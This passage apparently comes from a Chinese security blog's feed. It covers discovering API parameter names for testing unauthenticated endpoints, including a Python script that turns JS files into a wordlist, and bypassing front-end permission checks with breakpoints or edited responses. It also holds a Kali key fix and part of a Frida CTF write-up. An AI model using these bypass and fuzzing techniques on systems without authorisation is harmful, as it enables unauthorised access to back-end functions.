</p><p>Burp标记参数名部分，用字典去跑即可，这种手法比较依赖字典的强度，参数名字典github上能找到非常多，师傅们综合着使用就行。这种手法有一个显著的问题是，如果目标需要的参数太多，实际上很难用这种方法去找参数效率很低。有时候我们找到一些关键的参数，可能接口就能用了。比如查询类接口，一般有一个query、q之类的参数，传入要查询的信息，虽然这个接口可能还有pageSize、Limit、Order等约束条件作为参数，但是不一定要传入。这种情况下我们找出一个query参数就能愉快调用了。但是如果开发者过于严厉，必须得传入所有参数才能调用，那就很难受了。</p><p>因此除了Burp，还有一些专门用于参数名FUZZ的工具，可以应对一下我们上述提到的情况，比如Arjun，这个工具的用法就留给各位师傅自己摸索吧。</p><h2 id="0x05-通过“想当然”法从JS前后文中寻找参数名"><a href="#0x05-通过“想当然”法从JS前后文中寻找参数名" class="headerlink" title="0x05 通过“想当然”法从JS前后文中寻找参数名"></a>0x05 通过“想当然”法从JS前后文中寻找参数名</h2><p>除了这样傻傻的去FUZZ参数名，有没有什么方法能比较直白地获取到参数呢？当然是有的，既然网站的功能要正常调用这些接口，说明关键的参数肯定也写在JS里了，我们前文提到的各种工具都会告诉你提取的接口出自哪个JS文件：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221805769.png" alt="img"> </p><p>那我们就点进对应js文件，搜索部分接口uri，去定位前后文。</p><p>比如上面的接口dev-api&#x2F;system&#x2F;pass&#x2F;get&#x2F;email&#x2F;code</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806608.png" alt="img"> </p><p>这里也是成功定位到了。然后你会问，我看不懂这么复杂的JS，是不是就寄了？其实不是，这种纯靠猜和“想当然”就能拿下了，为什么呢？我们放大来看：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806793.png" alt="img"> </p><p>先离他最近的，是不是就指示了它的传参是get模式。Ok，现在知道传参类型了。那么参数名呢？我们还是在这个接口的周围去看，发现离他最近的有个这个</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806711.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806435.png" alt="img"> </p><p>注意看这几个东西，userName、tenantCode、code、newPassword，这几个东西是不是就特别像参数名？那我们直接来试一试，首先不带参数访问</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221806380.png" alt="img"> </p><p>那么加上刚刚的参数呢？</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221807531.png" alt="img"> </p><p>虽然可能因为一些参数值没写好，所以也没有调用成功，但通过返回结果的变化，说明我们已经找对参数名了，后续再FUZZ参数值即可。我们再多来几个不同但是类似的情况。</p><p>假设现在又找到一个接口&#x2F;wxpublic&#x2F;auth，又没有参数，那么还是老样子，进js去搜这个接口</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221807878.png" alt="img"> </p><p>找到，然后还是看它前后文呗：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221807101.png" alt="img"> </p><p>这几个什么authorizerAppId、compaanyId、scope、redirect，都看起来很像参数啊，我们前面说过，这些疑似参数的，那直接全部一股脑写上呗，多找几个多写几个又不会掉块肉，那现在我们尝试一下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221807258.png" alt="img"> </p><p>可以看到接口已经成功调用了，我们找的参数没问题！</p><p>总之，一个比较有效的寻找参数名的方法就是回到JS原文，先定位到接口在JS代码中的位置，再去分析其前后文，寻找一些比较类似参数名的字符串，然后尝试去测试即可。</p><h2 id="0x06-将JS拆分成大字典进行参数FUZZ"><a href="#0x06-将JS拆分成大字典进行参数FUZZ" class="headerlink" title="0x06 将JS拆分成大字典进行参数FUZZ"></a>0x06 将JS拆分成大字典进行参数FUZZ</h2><p>上面我们介绍了通过分析JS前后文去寻找参数名，但是有些时候，参数名并不会老老实实的放在目标接口的前后文，各种写法和风格千奇百怪，有时候参数名相关的部分可能和接口相关的部分隔得很远，如果JS基础不好是很难看出来的（更何况这些JS代码没有格式化，密密麻麻的更难看懂）。</p><p>这种情况下对于不会JS的玩家还有没有什么比较友好的操作呢？当然有，既然参数值无论如何也会在JS里，还有种办法是粗暴地把你下载回来的所有JS文件打散成参数字典，核心正则如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">matches = re.findall(r&#x27;[a-zA-Z]+[\w-]*\d*|\d+[\w-]*[a-zA-Z]+|[a-zA-Z]+\.[a-zA-Z]+|\w+\.\d+|[a-zA-Z]+~[a-zA-Z]+|\w+~\d+|\d+-\d+|[a-zA-Z]+-[a-zA-Z]+&#x27;, line)</span><br></pre></td></tr></table></figure><p>可以用这个正则替换我在上一篇文章的文末给出的小脚本中的正则，实现提取参数的效果，效果类似下面这样：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">fileurl=sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">filemkdir=fileurl.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filemkdir):    </span><br><span class="line">    os.makedirs(filemkdir)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get path  + 路径名称</span></span><br><span class="line">paths=[]</span><br><span class="line"><span class="keyword">for</span> dirpath, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">&#x27;./&#x27;</span>+filemkdir):    </span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> filenames:        </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+filemkdir+<span class="string">&quot;/&quot;</span>+file,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;gb18030&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f2:            </span><br><span class="line">            <span class="keyword">try</span>:                </span><br><span class="line">                line=f2.readlines()                </span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> line:                    </span><br><span class="line">                    line=line.strip(<span class="string">&#x27;\n&#x27;</span>).strip(<span class="string">&#x27;\t&#x27;</span>)                    </span><br><span class="line">                    <span class="comment">#print(line)  </span></span><br><span class="line">                    p = re.findall(<span class="string">r&#x27;[a-zA-Z]+[\w-]*\d*|\d+[\w-]*[a-zA-Z]+|[a-zA-Z]+\.[a-zA-Z]+|\w+\.\d+|[a-zA-Z]+~[a-zA-Z]+|\w+~\d+|\d+-\d+|[a-zA-Z]+-[a-zA-Z]+&#x27;</span>, line)            </span><br><span class="line">                    <span class="comment">#print(p)                    </span></span><br><span class="line">                    <span class="keyword">if</span> p != <span class="literal">None</span>:                        </span><br><span class="line">                        <span class="comment">#print(p)                        </span></span><br><span class="line">                        <span class="keyword">for</span> path <span class="keyword">in</span> p:                            </span><br><span class="line">                            path=path.replace(<span class="string">&#x27;:&quot;&#x27;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&quot;</span>)                            </span><br><span class="line">                            paths.append(file+<span class="string">&quot;---&quot;</span>+path)            </span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:                </span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> <span class="built_in">sorted</span>(<span class="built_in">set</span>(paths)):    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (fileurl+<span class="string">&#x27;_path.txt&#x27;</span>,<span class="string">&quot;a+&quot;</span>,encoding=<span class="string">&#x27;gb18030&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> paths:        </span><br><span class="line">        paths.write(var+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808697.png" alt="img"> </p><p>结合前文提到的Burp或者Arjun进行参数FUZZ即可，虽然也比较耗时耗力，但是成功率还是要高上一些。</p><h2 id="0x07-使用“输入输出法”寻找参数名"><a href="#0x07-使用“输入输出法”寻找参数名" class="headerlink" title="0x07 使用“输入输出法”寻找参数名"></a>0x07 使用“输入输出法”寻找参数名</h2><p>这是笔者自己命名的一个比较有意思的方法。在正式介绍这个方法之前，我们还是要介绍WEB的一些开发思路和习惯（尤其是大部分MVC框架）。我想首先把网站里大部分普通接口划分为两类，第一类就是输出信息返回给用户或前端的（查），另一类则是实现增、删、改功能的。假设一个接口&#x2F;api&#x2F;shop&#x2F;selectinfo，这是一个返回商品信息的接口，后端查询商品信息并返回给用户。另外一个接口&#x2F;api&#x2F;shop&#x2F;edit。很显然地，它是编辑商品信息的接口，用户提供商品信息对应的参数，完成商品信息的修改。那么这和开发习惯、寻找参数有什么关系呢？</p><p>简单来说，实际上我们对数据库中的东西进行增删改查，最后都会和代码中预先设置好的类建立映射关系（Model），比方说我现在要实现一个功能，要对商品信息进行增删改查，根据面向对象开发思想，当然需要有一个商品类保存各类商品属性。当我想要获取商品信息的时候，从数据库里查询商品信息并利用这些信息生成商品对象，依此类推更新、删除、插入等操作，也就是建立起了一个类-数据库的关系。而我们增删改查操作的东西，实际上就是商品这个类，具体来说是类中的属性，比如商品价格对应一个属性，商品数量对应一个属性，对应反映到WEB上就是price、count等参数值，既然关于商品的不同操作实际上操作的都是同一个类，那么参数值（类中的属性）肯定都是高度类似的，大部分情况下实际上是完全相同的。</p><p>比方说上文提到的返回商品信息的接口和编辑商品信息的接口，它们操作的对象都是“商品”，那么这两个接口涉及到的参数有极大可能是完全一致的，比方说商品名、价格、商品描述等属性，就算有不一致的参数也会是少数。</p><p>其实在上文中我们就已经涉及到这方面的知识了，上文给出的图在这里再复用一遍</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221809951.png" alt="img"> </p><p>如图，我们user控制器中的save动作，其将UserDTO类对象作为一个参数传入，UserDTO类里面有一些属性：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221810940.png" alt="img"> </p><p>也就是说，&#x2F;save&#x2F;valid这个接口（对应save动作），应该接受userId、username等等参数。那么既然如此，我们是不是也可以写出下面这样的动作：</p><p>public RspDTo delete(@RequestBody @Validated UserDTO userDTO)</p><p>同样去操作userDTO对应的用户属性，实现一个删除用户信息的效果？那假如我要获取用户信息呢？是不是同样也是从数据库查询到用户信息后，生成一个userDTO用户对象，然后将这个对象中的属性返回给用户呢？而最有意思的是，在很多java网站中，输出相关的接口（比如返回商品信息）返回的数据基本都会包含属性（参数名）。这也就意味着，如果我们的输入相关接口（如编辑商品信息）找不到参数名，可以去输出相关接口里找。同时输出相关的接口，其参数一般都比较简单，比较好fuzz，比如提到的&#x2F;api&#x2F;shop&#x2F;selectinfo，也许只需要商品名之类的简单参数。我们可以先观察接口名字，找一组“输入输出接口”，当输入相关接口fuzz不出参数，可以找寻对应的输出相关接口，FUZZ其参数，然后通过观察接口返回的信息，来获取具体的参数值，多说无益，我们来给一个案例。</p><p>挖掘到了一个接口，根据其名字，是编辑学校信息相关的：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808190.png" alt="img"> </p><p>比较难受，找不到参数名，经过fuzz也没有结果。</p><p>根据“输入输出”这一思想的指导，如果我们把学校信息视作一个类，我们上面有编辑（输入）学校信息相关的接口，那应该也会有输出学校学校信息相关的接口。可以筛查出：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808150.png" alt="img"> </p><p>访问该接口，实际上可以看到很多东西：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808222.png" alt="img"> </p><p>注意这些fullTeacherAvgPeriod、sso、logo，根据上述理论，这些应该就对应学校信息类中的某些属性，很有可能作为&#x2F;edit接口的参数，我们直接把这个返回包中的关键部分，粘贴到输入接口去利用，会怎么样呢？</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221808209.png" alt="img"> </p><p>成功调用。</p><h2 id="0x08-参数搜集之长期建设"><a href="#0x08-参数搜集之长期建设" class="headerlink" title="0x08 参数搜集之长期建设"></a>0x08 参数搜集之长期建设</h2><p>前文我们依次介绍了几种搜集参数的方法，其实我们的视角是在不断拓宽的，一开始我们搜集参数纯粹是以攻击者的视角来看待这个问题，后面慢慢拓展到以开发者的视角来看待这个问题。其实还可以再拓宽一点，比较正规一点的开发团队、项目，内部肯定是有很多开发上的规定的，其中当然也包括参数的命名规范、规律。同一个公司的不同业务的各个接口用到的参数，会有相似之处，甚至是相同。因此我们要对某个目标进行长时间的深入测试，其实可以准备一些burp插件，把平时关于该目标相关资产的请求、响应中出现的参数名保存下来，就可以生成一个专属目标的参数名字典。这样，当我们遇到和该目标有关的缺失参数名的测试场景时，就可以用这个专属参数名字典去进行参数的FUZZ了。</p><p>Github上也能找到一些干这个事的插件，例如：</p><p><a href="https://github.com/Giftedboy/ParasCollector">https://github.com/Giftedboy/ParasCollector</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221810623.png" alt="img"> </p><p>不过据作者自谦说这个插件不是很好用，师傅们也可以找找有没有别的类似的插件，有好用的也欢迎在评论区推荐一下哦。</p><h2 id="0x09-使用搜索引擎寻找参数"><a href="#0x09-使用搜索引擎寻找参数" class="headerlink" title="0x09 使用搜索引擎寻找参数"></a>0x09 使用搜索引擎寻找参数</h2><p>这个姿势主要是针对GET传参的，简单来说就是搜索引擎会收录一些带参数的url，如果你想查的接口访问的人比较多，并且恰好被搜索引擎收录了，也有一定概率把参数查出来，不过这种方法不怎么通用。案例如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221810585.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811090.png" alt="img"> </p><h2 id="0x10-修改前端Uri鉴权逻辑便捷测试接口未鉴权问题"><a href="#0x10-修改前端Uri鉴权逻辑便捷测试接口未鉴权问题" class="headerlink" title="0x10 修改前端Uri鉴权逻辑便捷测试接口未鉴权问题"></a>0x10 修改前端Uri鉴权逻辑便捷测试接口未鉴权问题</h2><p>上面我们介绍了很多种获取接口对应的参数的技巧，但其实我们不要忘记自己的目的，不能为了找参数而找参数。我们去测试接口，找接口未鉴权，实际上就约等于找后台功能未鉴权。既然如此，如果我们能想办法看到后台的一些页面，去调用页面里面的一些功能，发出请求，那是不是根本不需要管什么参数的问题？这样正常调用功能点发出来的请求，里面大概率是会携带上你的参数的。</p><p>这就和我们上一篇文章产生了联系，上一篇文章中我们提到，我们提取JS中的uri时，实际上会顺带提取出一些前端uri</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811965.png" alt="img"> </p><p>比如上图中的&#x2F;login、&#x2F;menu&#x2F;list等等，这些都是前端uri。这时候就很开心，我直接进行一个拼接。比如说：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://test.com/<span class="comment">#/login</span></span><br><span class="line">http://test.com/login</span><br></pre></td></tr></table></figure><p>尝试拼接一个</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://test.com/<span class="comment">#/menu/list</span></span><br><span class="line">http://test.com/menu/<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p>尝试去访问这些别的前端uri，看看能不能访问到对应的页面。这样一般也会有三种情况，第一种是目标站点没有任何对前端uri的鉴权。我们这么去访问，能直接看到页面，也不会给你跳转啥的，这时候就可以调用页面上的功能去抓包，分析这些功能点对应的接口的问题了。</p><p>第二种情况稍微好点，就是你这么去访问，有概率看到要访问的页面闪一下，然后给你重定向回登录页面，这种时候有种拼手速的玩法，在重定向回登录页面之前，浏览器上的刷新按钮会变成这个状态：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811297.png" alt="img"> </p><p>在他重定向回去之前，快速点一下这个X，那么后续动作就会终止执行，你的页面就会卡住。这时候我们也是开启burp愉快抓包就行。其实就是阻止重定向的思路。</p><p>第三种情况就是，我们没法看到想访问的页面，前端要么没反应，要么给你弹出个没有权限，要么直接重定向到&#x2F;login登录页。这种时候我们又该怎么测试呢？下面的内容就需要一点前端调试和JS分析的基础了，本文不会深入展开，仅作案例介绍。</p><p>假设这么一个网站，我们提取出一个前端uri为&#x2F;home （很常见）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811632.png" alt="img"> </p><p>我们自然要尝试访问，一访问，发现直接给我们重定向到登录口</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811641.png" alt="img"> </p><p>我们自然要尝试访问，一访问，发现直接给我们重定向到登录口<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221811637.png" alt="img"></p><p>这就说明这个前端至少有两层校验，一层与用户登录状态有关，一层与用户权限有关。怎么办呢？我们在控制台搜索“内测”关键词，定位到用户权限鉴权逻辑。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812074.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812251.png" alt="img"> </p><p>分析这个局部，我们其实很容易能注意到这里的前端鉴权逻辑。前端获取o.state.account.permission属性，一旦这个属性为false，那么就会提示平台内测这个错误，无法访问到对应的前端uri。</p><p>那么用户登录状态对应什么属性呢？往上翻一下，不难看出对应o.state.baseInfo.isLogin属性</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812580.png" alt="img"> </p><p>因此我们可以推测，state中保存了用户的基本信息，比如登录状态、权限等等。因此这里好办了，我们给上述两个位置打上断点，重新访问&#x2F;home。进入第一个断点</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812048.png" alt="img"> </p><p>在控制台将其强行改为true</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812163.png" alt="img"> </p><p>进入下一段：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812095.png" alt="img"> </p><p>同样地，再控制台对其赋值为1</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812081.png" alt="img"> </p><p>再往下走，此时会跳转到一个contract页面</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813046.png" alt="img"> </p><p>虽然没进入home页面，但是这样，我们就来到了一个原本无法直接访问到的一个前端uri，这样就可以调用它的功能了，看这个页面要填的东西很多，最后的传参肯定巨复杂，就算开发好心告诉你缺了什么参数，你敲都要敲半天，用这种方法测起来就快多了。</p><p>当然，我们的目的是进入home页面，重定向到这个完善账号信息的页面，说明还是有哪里的鉴权没搞好，我们再回到刚刚的鉴权逻辑部分</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813747.png" alt="img"> </p><p>可以发现，后续其实还对o.state.account.permission的值做了一个判断，如果值为1，那么会直接进入contract页面。值只要是大于1的整数，其实都可以访问到home页面</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813726.png" alt="img"> </p><p>因此在控制台将permission改为3</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813388.png" alt="img"> </p><p>再访问home，成功：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813515.png" alt="img"> </p><p>这样，我们就可以愉快的测试后台的各种功能点了。当然上述操作对不懂JS和前端调试的师傅肯定也不太友好。实际上上述操作和平时测试业务逻辑漏洞中的“修改返回包”操作是有等价关系的。为什么这么说呢？</p><p>我们重新访问一下home页面，然后在burp抓包，拦截一下返回包。</p><p>可以看到一个&#x2F;state_user的后端接口，从这个接口的名字我们其实就知道，它是用来判断一个用户状态的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813184.png" alt="img"> </p><p>然后你再注意这里的account_state，默认是0。以及这个is_login，默认是false。他们是不是就特别像我们刚刚在JS里分析出来的o.state.account.permission和o.state.baseInfo.isLogin？我们推测这个前端实际上就是从返回包里拿到account_state和is_login，并分别给o.state.account.permission、o.state.baseInfo.isLogin赋值的。</p><p>因此我们将其分别改为3和true，然后把另一个code改为200，发包</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813645.png" alt="img"> </p><p>还是能看到后台页面。这样虽然操作起来比较简单友好，但是万一目标前端对响应结果的判断设置的比较复杂，那就不是那么好办了，比如我前端判断permission为test123abcdef才为有效，我们常见的改响应包的方法就很难改成这样了，所以还是回到JS去分析调试才能应对大部分奇葩情况，还是比较吃基本功的。</p><h2 id="0x11-关于参数值"><a href="#0x11-关于参数值" class="headerlink" title="0x11 关于参数值"></a>0x11 关于参数值</h2><p>上面我们找到了接口，找到了参数名，绝大部分情况下就可以直接开始测试了，但有些时候我们可能还会面临一些关于参数值的FUZZ问题，但是到这里就很简单了。这部分问题大多数情况下集中于json传参的情况，json传参里常见的类型其实也就是下图这些</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221814663.png" alt="img"> </p><p>a为整型，b为字符串类型，c为布尔类型，d为数组类型，e为对象类型。这几种类型都试一下准没错，而且大多数情况下类型错了后端是要直接抛出异常信息的，从异常信息里就很容易能看出来这个地方要传入什么类型，比如异常里看到xxxxx Object xxxxxx，就可以猜测某个参数可能要传入对象类型的传参。</p><p>此外还有一点和传参值限制有关的问题就是我们可能会遇到一些字符串格式化问题。比方说一个</p><p>Date&#x3D;</p><p>看到这样的参数名，然后发现自己参数值怎么测都测不对的话，可能是后端对这里传入的字符串做了日期类型的格式化、类型限制或正则匹配，这时候可以考虑传入2024-09-07 12:00:00这样符合格式的字符串。还有些可能出现这种问题的参数，一般都和身份证、手机号、邮箱等个人信息有关。不排除开发者自己设定了一些乱七八糟的字符串格式，这些就得具体情况具体分析了。</p><h2 id="0x12-结语"><a href="#0x12-结语" class="headerlink" title="0x12 结语"></a>0x12 结语</h2><p>在日常测试中，我们找到了一个可能存在未鉴权问题的接口，但找不到对应的参数，确实是个很令人红温的问题，希望这篇分享能帮助师傅们找到参数，可能有一些没有提到，欢迎师傅们补充。本系列目前已经分析了攻击者可以从JS中提取哪些信息，分析了应该如何提取参数名参数值以辅助接口测试，但还有一个很重要的问题没有解决——在不同场景下攻击者应该如何获取JS。因此后续几篇文章会介绍不同场景下获取JS的方法。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 参数提取 </tag>
            
            <tag> fuzz </tag>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>问题解决-kali linux出现下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository ＜devel@kali.org＞</title>
      <link href="/2024/09/20/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3-kali%20linux%E5%87%BA%E7%8E%B0%E4%B8%8B%E5%88%97%E7%AD%BE%E5%90%8D%E6%97%A0%E6%95%88%EF%BC%9A%20EXPKEYSIG%20ED444FF07D8D0BF6%20Kali%20Linux%20Repository%20%EF%BC%9Cdevel@kali.org%EF%BC%9E/"/>
      <url>/2024/09/20/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3-kali%20linux%E5%87%BA%E7%8E%B0%E4%B8%8B%E5%88%97%E7%AD%BE%E5%90%8D%E6%97%A0%E6%95%88%EF%BC%9A%20EXPKEYSIG%20ED444FF07D8D0BF6%20Kali%20Linux%20Repository%20%EF%BC%9Cdevel@kali.org%EF%BC%9E/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>1、使用kali安装软件的时候报错，且安装失败，找不到安装包</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409201056801.png" alt="image.png"> </p><p>2、起初以为是安装源的问题，更改安装源后，<code>apt-install update</code>更新源，报错如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409201056832.png" alt="image.png"> </p><p>3、解决办法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget archive.kali.org/archive-key.asc   //下载签名</span><br><span class="line">apt-key add archive-key.asc   //安装签名</span><br></pre></td></tr></table></figure><p>重新更新安装源，没有再报错了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409201057303.png" alt="image.png"> </p><p>4、尝试安装软件，也不再有报错：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409201057229.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 问题解决 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida-labs(3)</title>
      <link href="/2024/07/27/frida-labs(3)/"/>
      <url>/2024/07/27/frida-labs(3)/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="challenge-0x0A"><a href="#challenge-0x0A" class="headerlink" title="challenge 0x0A"></a>challenge 0x0A</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281611808.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281611170.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activityMainBinding.sampleText.setText(stringFromJNI());</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281612397.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_flag</span><br><span class="line">Java_com_ad2001_frida0xa_MainActivity_stringFromJNI</span><br></pre></td></tr></table></figure><p>在Java层中引用了 <code>stringFromJNI</code>函数，可以看到该函数作用就是设置了文本“Hello Hackers”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281612826.png" alt="image.png"> </p><p>继续再看<code>get_flag</code>函数，这个函数没有在JAVA层中声明，也没有在库中引用。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281612978.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281613262.png" alt="image.png"> </p><p>接下来，看他的反编译：</p><p>该函数接受两个整数值，将它们相加，然后检查结果是否等于 3。如果等于 3，则存在循环。它对硬编码字符串 <code>FPE&gt;9q8A&gt;BK-)20A-#Y</code> 进行解码并记录解码后的flag。因此，要获取flag，我们需要调用此方法。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281623554.png" alt="image.png"> </p><p>所以，这块使用frida直接调用<code>get_flag</code>函数</p><p>1、下面是一个参考模板</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var native_adr = new NativePointer(&lt;address_of_the_native_function&gt;);</span><br><span class="line">const native_function = new NativeFunction(native_adr, &#x27;&lt;return type&gt;&#x27;, [&#x27;argument_data_type&#x27;]);</span><br><span class="line">native_function(&lt;arguments&gt;);</span><br></pre></td></tr></table></figure><p>逐行解释一下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var native_adr = new NativePointer(&lt;address_of_the_native_function&gt;);</span><br></pre></td></tr></table></figure><p>要在 frida 中调用本机函数，我们需要一个 <code>NativePointer</code> 对象。我们应该将要调用的本机函数的地址传递给 NativePointer 构造函数。接下来，我们将创建 <code>NativeFunction</code> 对象，它代表我们要调用的实际本机函数。它围绕本机函数创建一个 JavaScript 包装器，允许我们从 frida 调用该本机函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const native_function = new NativeFunction(native_adr, &#x27;&lt;return type&gt;&#x27;, [&#x27;argument_data_type&#x27;]);</span><br></pre></td></tr></table></figure><p>第一个参数应该是 <code>NativePointer</code> 对象，第二个参数是本机函数的返回类型，第三个参数是要传递给本机函数的参数的数据类型列表。现在我们可以像在 java 空间中一样调用该方法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">native_function(&lt;arguments&gt;);</span><br></pre></td></tr></table></figure><p>后面直接调用即可。</p><p>2、编写脚本调用</p><p>①获取函数的地址，这块使用基址+偏移的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.ad2001.frida0xa ]-&gt; Module.getBaseAddress(&quot;libfrida0xa.so&quot;)</span><br><span class="line">&quot;0xc1859000&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281625260.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281625554.png" alt="image.png"> </p><p>So the offset &#x3D; <code>0x00028bb0</code> - <code>0x00010000</code> &#x3D; <code>0x18BB0</code>. Now we can add that to the base.</p><p>现在就获取到了函数的地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var adr = Module.findBaseAddress(&quot;libfrida0xa.so&quot;).add(0x18BB0)</span><br></pre></td></tr></table></figure><p>②调用函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> adr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x18BB0</span>) <span class="comment">// Address of the get_flag() function</span></span><br><span class="line"><span class="keyword">var</span> get_flag_ptr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(adr);</span><br><span class="line"><span class="keyword">const</span> get_flag = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(get_flag_ptr, <span 